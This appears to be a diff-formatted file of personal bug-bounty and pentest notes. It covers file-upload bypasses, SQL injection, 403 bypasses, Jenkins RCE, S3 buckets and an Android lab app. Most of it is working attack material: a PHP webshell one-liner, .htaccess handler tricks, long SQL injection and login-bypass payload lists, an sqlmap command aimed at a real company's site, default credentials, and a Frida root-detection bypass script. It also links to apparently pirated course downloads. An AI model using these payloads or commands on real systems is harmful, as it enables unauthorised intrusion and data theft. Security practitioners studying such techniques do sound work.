+Bypass by adding evil.svg.jpg
+
+Change the file extension from .jpg to .html  and content type to text/html
+
+**(6)** GIF98a & GIF8 
+
+  = .jpg file  → add this at the start of the weshell file
+
+**(7) Content-type validation:**- 
+
+Change the file name as shell.php but keep the content type as  image/ *
+
+image/png’, ‘image/jpeg’,’image/gif’ 
+
+**(8) Blacklisting bypass:-  Bruteforce this file Extension** 
+
+[fileuploadbypass.txt](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0d2c3ddc-6689-4c73-be96-a7211ed665d8/fileuploadbypass.txt)
+
+If windows server upload .ASPX shell
+
+How to create .asp reverse shell → [https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/](https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/)s
+
+file.html%00.pdf - bypasss
+
+- [https://mukarramkhalid.com/imagemagick-imagetragick-exploit/](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)     (ImageMagick)
+- Check MIME-Type
+- Intercept request and change MIME-Type as desired
+- 
+
+                                                       image.png.php  & image.php%00.png (nullbyte char)
+
+[https://m0chan.github.io/2020/02/04/Arbitary-File-Upload-Too-Stored-XSS.html](https://m0chan.github.io/2020/02/04/Arbitary-File-Upload-Too-Stored-XSS.html)
+
+**(9) Disable Javascript - extension**
+
+Change the file to shell.jpg.php and conent type as image/jpeg
+
+**Content length Validation bypass:-**
+
+PHP shell:  (<?=`$_GET`?>)
+
+[contentlengthbypass.txt](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/bf941af6-27da-482d-99f9-713c542a4945/contentlengthbypass.txt)
+
+1. put file name ../../logo.png or ../../etc/passwd/logo.png to get directory traversal via upload file.
+2. upload the file using SQL command ‘sleep(10).jpg you may achieve SQL if image directly saves to db.
+3. Check for .svg file upload you can achieve stored XSS using XML payload
+4. Change the file name to xss payloads (<svg onload=alert(document.domain)> you can achieve xss
+
+Image magictrick
+
+nc -lnvp 4544
+
+**#Tool#**
+
+python3 [fuxploider.py](http://fuxploider.py/) --url [https://awesomeFileUploadService.com](https://awesomefileuploadservice.com/) --not-regex "wrong file type"
+
+systemctl start docker
+
+docker run -d -p 80:80 c0ny1/upload-labs:latest
+
+1) disable javscript using extension (disable javascript in firefox)
+
+2) change content type -  image/jpeg
+
+3) try suffix :- php2 php3 php4 php5 php6 php6 php7 pht phtm phtml  .php%00.jpg   php.jpg
+
+4) When all the file types are filtered. upload file  .htaccess  with 
+
+→ Content-Type: text/plain    and content would be
+
+→ SetHandler application/x-httpd-php
+
+→ Now upload .ppp (any file type it will be parsed as  php) file with  Content-Type: application/octet-stream and content as 
+
+     <?php phpinfo() ?>
+
+5)  Change file suffix Php PhP etc
+
+6) If server hosted on windows
+
+Add space or .   at the end of file name   eg   file.php.   file.php(space)
+
+file.php. .     windows bypass   dot space dot
+
+7) Double php=     .pphphp
+
+8) Add a gif prefix at the start of line
+
+GIF89a
+
+/include.php?file=upload/5920200720144906.gif   - you need lfi
+
+9) file.php .jpg    (give space after php)
+
+
+
+
+
+# SQL injection
+
+- SQL injecting in POST field
+- username: admin and password:’OR 1=1 — +
+- sqlmap -u [https://we.dji.com/zh-CN/campus/recruitment?id=1](https://we.dji.com/zh-CN/campus/recruitment?id=1) --dbs --level 5 --risk 3 --no-cast --tamper=space2comment
+- sqlmap -r request.txt -dbms=postgresql -dbs -v6          —hussain
+- Time based
+
+') or sleep(5)='
+1)) or sleep(5)#
+")) or sleep(5)="
+')) or sleep(5)='
+;waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+
+===========================================================================
+
+SQL injection
+
+use
+\
+'
+"
+`')`
+
+`")`
+
+`)
+'))
+"))
+`))
+
+website?id[]=1       → add []
+
+id=1%bf&username=d    →  use %BF , %ff
+%00, "><, ??  (use website qaz.wtf)
+
+[https://qaz.wtf/u/convert.cgi?text=a](https://qaz.wtf/u/convert.cgi?text=a)   (convert into unicode text)
+
+1. Test in GET and POST request parmeter
+2. Accept-Language
+3. Autectication forms
+4. path base input
+api/user/1'
+5. language= parameter
+6. Headers
+
+blind time based sql payload lang=1'; waitfor delay '0:0"9' -
+
+Use sql paylods available in github
+
+Use Atlas sqlmap  - create tamper script
+[https://github.com/m4ll0k/Atlas](https://github.com/m4ll0k/Atlas)
+
+Find website ip address to bypass cloudflare -
+
+[https://viewdns.info/iphistory/](https://viewdns.info/iphistory/)[https://bgp.he.net/](https://bgp.he.net/)    -> ip ranges
+
+sqlmap -u --file-read "/etc/passwd"   (to read local files)
+
+sqlmap -r request.txt -dbms=postgresql -dbs -v6
+
+
+
+
+
+# login page bypass using sql
+
+'--' / "--"
+admin' #
+admin' --
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'#
+admin' or '1'='1'--      juice
+admin' or '1'='1'/*
+admin' or 1=1
+admin' or 1=1#
+admin' or 1=1--
+admin' or 1=1/*
+admin') or ('1'='1
+admin') or ('1'='1'--
+admin'or 1=1 or ''='
+HAVING 1=0
+HAVING 1=0#
+HAVING 1=0--
+HAVING 1=1
+HAVING 1=1#
+HAVING 1=1--
+" or ""-"
+' or ''-'
+OR 1=0
+OR 1=0#
+OR 1=0--
+or 1=1
+or 1=1#
+or 1=1--
+or 1=1/*
+OR 1=1
+OR 1=1#
+OR 1=1--
+OR 3409=3409 AND ('pytW' LIKE 'pytW @
+OR 3409=3409 AND ('pytW' LIKE 'pytY
+" or true--
+' or true--
+OR x=x
+OR x=x#
+OR x=x--
+OR x=y
+OR x=y#
+OR x=y--
+
+
+# Parameter pollution/Price tampering
+
+- Parameter pollution on social sharing button
+
+1. Try entering the wrong coupon and changing the response to that of the correct coupon code response. You might end up getting a discount for the wrong coupon code.
+2. Enter the crct and try to tamper the discount value to the maximum value
+
+3. If the company has cancellation policy and if they are cancellation amount. Try to order the product and cancel it sometimes you might find the canceling money in the request and tamper it.
+
+
+
+
+# Path Travesal
+
+- Input =WEBSERVICE("file:///etc/passwd")   add the content in .ods fie excel
+
+
+Introspection query:-  
+
+{"query":"query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}
+
+
+
+# Oauth
+
+[https://www.youtube.com/watch?list=PLIK9nm3mu-S6gCKmlC5CDFhWvbEX9fNW6&v=X0mV9HXbKHY&feature=emb_title](https://www.youtube.com/watch?list=PLIK9nm3mu-S6gCKmlC5CDFhWvbEX9fNW6&v=X0mV9HXbKHY&feature=emb_title)
+
+- Token Stealing
+
+[https://medium.com/@0xgaurang/case-study-oauth-misconfiguration-leads-to-account-takeover-d3621fe8308b](https://medium.com/@0xgaurang/case-study-oauth-misconfiguration-leads-to-account-takeover-d3621fe8308b)
+
+[https://github.com/topavankumarj/Vulnerable-OAuth2.0-Application](https://github.com/topavankumarj/Vulnerable-OAuth2.0-Application)   lab
+
+[https://blog.avuln.com/article/4](https://blog.avuln.com/article/4)
+
+
+
+
+# Turbo Intruder
+
+Higlight the number → right click → send to turbo intruder 
+
+concurrentConnections=5,
+requestsPerConnection=100
+
+pipeline=true
+
+if '200 OK' in req.response:
+
+payload :- /root/Desktop/payloads/number_payload/3.txt
+
+
+
+
+site:amazonaws.com inurl:bugcrow.com
+
+"amazonaws.com" equifax
+
+[https://blog.securelayer7.net/hands-on-aws-s3-bucket-account-takeover-vulnerability/](https://blog.securelayer7.net/hands-on-aws-s3-bucket-account-takeover-vulnerability/)    - POC
+
+[https://medium.com/@janijay007/s3-bucket-misconfiguration-from-basics-to-pawn-6893776d1007](https://medium.com/@janijay007/s3-bucket-misconfiguration-from-basics-to-pawn-6893776d1007)    everythin about s3 bucket
+
+aws s3 ls s3://hubspot-forms-static-embed
+
+aws s3 ls s3://[bucketname] --no-sign-request
+
+tradingview_staging
+
+
+
+# RCE
+
+Jenkins to rce
+
+Script console command :-
+
+String ContentRead = new File('/etc/passwd').getText('UTF-8')
+
+"ls /".execute().text'
+
+
+
+
+
+# 403 Bypass
+
+X-Real-IP: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+
+X-Forwarded-For: [http://127.0.0.1:80](http://127.0.0.1/)
+
+[https://host.com/path](https://host.com/path) 403 forbideen
+[https://host.com/./path](https://host.com/path) 200 OK
+
+X-Custom-IP-Authorixation: 127.0.0.1  
+
+try while delete request 
+
+use tool byp4xx
+
+./byp4xx.sh [https://www.google.es/](https://www.google.es/test)admin
+
+dirdar -single target -wl root/Desktop/all_txt/403.txt
+
+User-Agent: okhttp/4.1.1   - on api endpoint
+
+
+
+
+
+
+admin admin
+admin password
+user user
+user password
+test test
+root password
+root root
+
+
+
+C:\Users\Velocity\AppData\Local\Programs\Python\Python38\Scripts    all python files are installed
+https://www.youtube.com/watch?v=JR4gDRYzY2c&t=221s   magicx install
+How to Connect Andriod studio with burp
+
+Go to burp -> options -> add another proxy listner
+in windows use cmd -> ipconfig -> make note of ipaddress
+Use the same ip in Andriod emulator and port 8081
+1
+192.168.29.120
+
+
+
+
+cd data/data   -> to get list of installed devices on emulator
+cd data/data/(packagename)  ->
+
+
+Username: securestore
+password: securestore
+
+Default user accounts available to login from the app (you can also register new account using signup feature):
+
++----+-----------------------+-
+
+username | password
+
++----+-----------------------+-
+
+securestore | securestore
+
+attacker       | attacker
+
++----+-----------------------+-
+
+start emulator
+Go to appie path and paste the frida-server file
+
+adb push frida-server /data/local/tmp/
+
+do -> adb shell
+su
+cd /data/local/tmp/
+chmod +x frida-server
+pip3 install objection
+
+==========================================================================================
+Apktool to make changes/modification to the application
+
+apktool d SecureStorev1.apk    (Apktool command to disamble)
+
+It will create a new folder.
+Check all the files.
+Make changes to the android manifest file.
+apktool b SecureStorev1 (folder name) to Asemble the changes
+
+go to SecureStorev1/dist folder and again disable the apk to check the changes in androidmeniest file
+
+If SDK version is higher than or equal to 24, User install certificate are ignored and we need to bypass it.
+
+3 ways to bypass SSL pinning.
+1) Patch the application to trust user install certiicates
+2) place user certificates in system certificate container
+3)Manipulate the app's runtime.
+
+==========================================================================================
+
+Configure burp  to caputure http trafic
+
+In burp proxy setting, edit and change it to all interface
+In Andriod emulator change it to manual and add 10.0.2.2 and 8080
+
+=========================================================================================
+Configure burp  to caputure https trafic
+
+import CA certificate to desktop
+From appie, adb push burp.crt /mnt/sdcard/
+
+======================================================================================
+If unable to intercept HTTPS trafice in burp above sdk 24
+
+=> We can reverse engineer using apktool
+
+apktool d SecureStorev2_noroot.apk
+
+in andriod manifest file check for any android:networkSecurityConfig="@xml/network_security_config
+
+Now in res folder check xml folder
+Under xml folder there will be network_security_config.xml
+Add and additional line <certificates src="user" />
+
+If incase XML files is not avaiable, we need to add android:networkSecurityConfig="@xml/network_security_config in andriod manifest file and also make XML file.
+
+Now asemble to file again after making the changes using apktool
+
+apktool b SecureStorev2_noroot (folder)
+
+New apk file will be available under C:\Appie\SecureStorev2_noroot\dist
+
+This apk file will not be install because it is not signed.
+We can use keytool and command is:-
+keytool -genkey -v -keystore mysigning.keystore -alias securestore -keyalg RSA -keysize 2048 -validity 10000
+
+After creating the key we need to sign the jarsigner to sign the apk.
+
+jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore mysigning.keystore SecureStorev2_noroot.apk securestore
+
+
+====================================================================================================
+
+Insecure data storage
+
+Enter random bank details:- in v1 app
+
+In Appie, adb shell -> su
+
+cd /data/data (to view all the packages in devices)
+search for com.androidpentesting.securestore
+
+cd com.androidpentesting.securestore
+
+/data/data/com.androidpentesting.securestore/shared_prefs
+
+cat userdata.xml  (to check sensitive info, however it is not considered in bug bounty coz it requires physical access and rooted device)
+
+======
+to check if bankdetails are stored locally:-
+/data/data/com.androidpentesting.securestore/databases
+sqlite3 userdb.db
+.tables
+select * from bankdetails;
+
+===================================================================================
+
+Server Side Vulnerabilities
+
+Go to v1 app
+login and click on profile and intercept the response-> send it to burp suite
+
+it expose password and token in clear text format
+also check for sql injection in token parameter.
+payload -  '+OR+'1'='1
+
+======================================================================================
+weak crypto and authorization
+
+when user token is saved locally in app
+
+go to /data/data/com.androidpentesting.securestore/shared_prefs
+cat userdata.xml
+
+copy
+<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
+<map>
+    <string name="AUTH_TOKEN">3f858cf8cfd59f25010e71b6b5671428</string>
+    <boolean name="ISLOGGEDIN" value="true" />
+    <string name="USERNAME">attacker</string>
+</map>
+
+Now find MD5 of securestore, create new file userdata.xml
+
+<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
+<map>
+    <string name="AUTH_TOKEN">212174768840da1c6a1604c8b485a0ee</string>
+    <boolean name="ISLOGGEDIN" value="true" />
+    <string name="USERNAME">securestore</string>
+</map>
+
+save it and push it to emulator.
+
+adb push userdata.xml /data/local/tmp/
+
+Now replace the original userdata.xml file
+cp /data/local/tmp/userdata.xml userdata.xml
+
+======================================================================================================
+
+Exported Application Components
+
+Activities, Services, Broadcast Receivers, Content providers
+
+Activity
+Check if activity is exposed or not, exported=true in Andriodmanifest.xml file
+Chekk if there is any intent filter under activity.
+
+Login to app and close the app.
+Now use adb shell to start that activity
+
+adb shell am (activity manager) start -n (name of the activity we want to start) com.androidpentesting.securestore/.UserMainActivity
+
+adb shell am start -n com.androidpentesting.securestore/.UserMainActivity
+
+**This can be useful of the activity is requires a PIN to access**
+**Root user can invoke any activity on the device hence root detection is implemented**
+
+
+Content providers
+Check if provider is exposed or not, exported=true in Andriodmanifest.xml file
+
+content query --uri content://sms/inbox
+
+======================================================================================================================
+
+insecure logging
+
+adb logcat -c
+
+adb logcat | grep 'securestore'    login into the app and check logcat in realtime and for sensitivity information
+=======================================================================================================================
+
+Client side vulnerability
+Enter bank details
+
+now enter email addres to view bank details
+
+adb logcat -c    to clear logcat
+now do adb logcat and enter ' (single quote) in email addres field.
+it will crash and check logcat file for sql queries
+x' or'x'='x
+
+=========================================================================================
+
+clipboard copy paste issue
+
+enter account number
+copy it and paste it in messages
+
+====================================================================================
+obfuscation
+root detection
+SSL pinning
+detecting debuggers
+end to end encryption
+
+SSL pinning prevent us to intercept the traffic.
+
+=========================================================================================
+
+Root detection bypass
+
+frida-ps -Uai    (to check all the packages name in emulator/device)
+the package name is com.androidpentesting.securestorev2
+frida-ps -Uai | grep 'Secure'
+com.androidpentesting.securestore
+frida -U -n "com.androidpentesting.securestorev2"   (specify package name)
+objection --gadget com.androidpentesting.securestorev2  explore  (hook into the specific gadget)
+
+https://medium.com/my-infosec-write-ups/frida-installation-40f52845ae98 (frida-server installation)
+
+***************
+First install frida server from https://github.com/frida/frida/releases
+frida-server-15.1.16-android-x86.xz
+push the file into device
+adb push frida-server /data/local/tmp
+su
+./frida-server
+*************************************************************************
+First run -> objection --gadget com.androidpentesting.securestorev2 explore
+then quickly run
+
+android hooking watch class com.androidpentesting.securestorev2.UserMainActivity  -> to check services running when application opens
+
+android hooking list classes   -> to list all classes
+
+android hooking list classes > list.txt
+
+android hooking list class_methods com.androidpentesting.securestorev2.UserMainActivity  -> to check methods
+eg:-  public boolean com.androidpentesting.securestorev2.UserMainActivity.isDeviceRooted()
+
+To disable root check after app launches -
+android hooking set return_value com.androidpentesting.securestorev2.UserMainActivity.isDeviceRooted false
+
+objection --gadget com.androidpentesting.securestorev2 explore -s "android hooking set return_value com.androidpentesting.securestorev2.UserMainActivity.isDeviceRooted false"   (we can try this method if it fails to bypass try the below method)
+************************************************************************
+next method to bypass root detection
+
+first run frida
+frida -U -f com.androidpentesting.securestorev2   (this will force the app to launch only and keep in freeze state)
+
+then in another terminal run
+objection --gadget com.androidpentesting.securestorev2 explore -s "android hooking set return_value com.androidpentesting.securestorev2.UserMainActivity.isDeviceRooted false"
+
+then in frida use %resume  (to resume the app)
+
+====================================================================================================
+next method to bypass root detection
+
+first run frida
+frida -U -f com.androidpentesting.securestorev2   (this will force the app to launch only and keep in freeze state)
+
+then in another terminal run
+objection --gadget com.androidpentesting.securestorev2 explore -s "android root disable"
+
+==========================================================================================================
+
+insecure data storage  using objection
+
+> frida -U -f com.androidpentesting.securestorev2
+
+> objection --gadget com.androidpentesting.securestorev2 explore -s "android hooking set return_value com.androidpentesting.securestorev2.UserMainActivity.isDeviceRooted false"
+
+Now enter any bank details in secure v2 app
+
+database details are stored in /data/data/com.androidpentesting.securestorev2/databases
+userdb.db
+
+We can also access this using objection
+In objection screen type  env
+cd /data/user/0/com.androidpentesting.securestorev2//databases
+sqlite connect userdb.db
+.tables
+select * from bankdetails
++----+--------------------------+--------------------------+--------------------------+-------+
+| ID | BANKNAME                 | ACCOUNTNO                | BRANCHNAME               | EMAIL |
++----+--------------------------+--------------------------+--------------------------+-------+
+| 1  | SmSs+95bk2t7xEezYkVaFQ== | SmSs+95bk2t7xEezYkVaFQ== | SmSs+95bk2t7xEezYkVaFQ== | test  |
++----+--------------------------+--------------------------+--------------------------+-------+
+
+
+=========================================================================================
+client side sql injection
+
+
+the data is encrypted
+however we can still get the data using sql bypass query 1' or'1'='1  in app
+
+========================================================================================
+Frida CLI and using custom script
+
+While creating frida script check if java runtime is available or not
+
+Java.available
+Java.androidVersion
+
+Java script can be written in Javascript and python + javascript
+
+frida -U -f com.androidpentesting.securestorev2 -l helloworld.js    (simple hellowrold script)
+
+frida -U -f com.androidpentesting.securestorev2 -l enumerate_classes.js   (to enumerate all classes)
+
+frida -U -n com.androidpentesting.securestorev2 -l enumerate_classes.js > classes.txt
+
+========================================================================================
+
+Bypass root detection using Frida only
+
+Custom script created for frida
+
+frida -U -f com.androidpentesting.securestorev2 -l bypassroot.js
+
+
+========================================================================================
+
+SSL pinning bypass
+
+
+Objection:-
+
+First bypass root detection
+
+Then in objection shell:-  android sslpinning disable
+
+Frida Script:-
+frida -U -n com.androidpentesting.securestorev2 -l sslbypass.js   (not working)
+
+
+===============================================================================
+
+
+Reversing and patching android app using apktool
+
+ apktool d SecureStorev2.apk
+
+go
+C:\Appie\SecureStorev2\smali\com\androidpentesting\securestorev2
+
+
+edit
+
+About$3.smali
+==========================
+Now bundle the apk
+
+keytool -genkey -v -keystore mysigning.keystore -alias securestore -keyalg RSA -keysize 2048 -validity 10000
+
+After creating the key we need to sign the jarsigner to sign the apk.
+
+jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore mysigning.keystore SecureStorev2.apk sslpinning
+
+
+windows privilege escalation
+https://www.udemy.com/course/windows-privilege-escalation/
+https://freeeducationweb.com/windows-privilege-escalation-for-oscp-beyond/?fbclid=IwAR3qiRzesZ5jG35O-0lu0aJC5tugT3CBt4R3T7qXdPoogfMlrYLc8M8krMs
+https://www92.zippyshare.com/v/BZMoKNaB/file.html
+
+
+linux privilege escalation
+https://www.udemy.com/course/linux-privilege-escalation/
+https://freeeducationweb.com/linux-privilege-escalation-for-oscp-beyond/
+Part 1
+https://www33.zippyshare.com/v/gWWaMbhr/file.html
+
+Part 2
+https://www33.zippyshare.com/v/MAuTNOee/file.html
+
+
+
+
+https://www.udemy.com/course/bug-bounty-an-advanced-guide-to-finding-good-bugs/   by Hussein Daher
+
+https://freeeducationweb.com/bug-bounty-an-advanced-guide-to-finding-good-bugs/
+
+
+
+
+https://github.com/justalinko/webshell   hackbar
+
+https://sourceforge.net/projects/cyberfox/files/Beta/Browser/Linux/ cyberfox
+
+
+
+
+
+Search via jadx
+
+SSLContext KeyStore TrustManagers  SSLpinning
+SSLError
+
+
+
+frida -l rootbypass.js -U -f com.androidpentesting.securestorev2 --no-pause
+
+	console.log("\nRoot detection bypass with Frida");
+	var CommonUtils = Java.use("com.androidpentesting.securestorev2.UserMainActivity");
+	console.log("\nHijacking isDeviceRooted function in CommonUtils");
+	CommonUtils.isDeviceRooted.implementation = function () {
+		console.log("\nInside the isDeviceRooted function");
+		return false;
+	};
+
+
+
+C:\Users\Velocity\AppData\Local\Android\Sdk\system-images\android-27\google_apis\x86
+
+
+
+ps -e | grep frida
+
+kill -9 6016
+
+
+
+https://www.youtube.com/watch?v=v8OVo4SIv8o   - xposed installer
+
+
+
+
+frida -l iroot.js -U -f com.androidpentesting.securestorev2 --no-pause
+
+
+
+=jy445o5"{LY8b^8|7sqq%eSB5.gKrZF
+
+1520623
+
+
+
+
+
+
+
+# Insecure Deserialization
+
+PHP Deserialization
+
+PHP magic method 
+
+__wakeup()
+
+__destruct()
+
+
+
